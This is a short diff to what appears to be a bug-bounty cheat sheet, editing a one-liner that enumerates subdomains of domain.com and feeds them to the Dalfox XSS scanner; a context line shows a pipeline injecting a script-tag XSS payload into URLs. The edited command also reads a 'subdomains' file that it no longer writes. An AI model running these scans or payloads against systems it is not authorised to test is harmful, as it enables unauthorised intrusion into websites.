@@ -34,5 +34,5 @@ cat domains.com.txt | gf xss | qsreplace '"><script>confirm(1)</script>' | while
 ## Find and testing XSS with Dalfox
 
 ```bash
-subfinder -d domain.com -o subdomains && httpx -l subdomains -o sites && cat sites | dalfox pipe -F
+subfinder -d domain.com -silent && httpx -l subdomains -silent | dalfox pipe -F
 ```
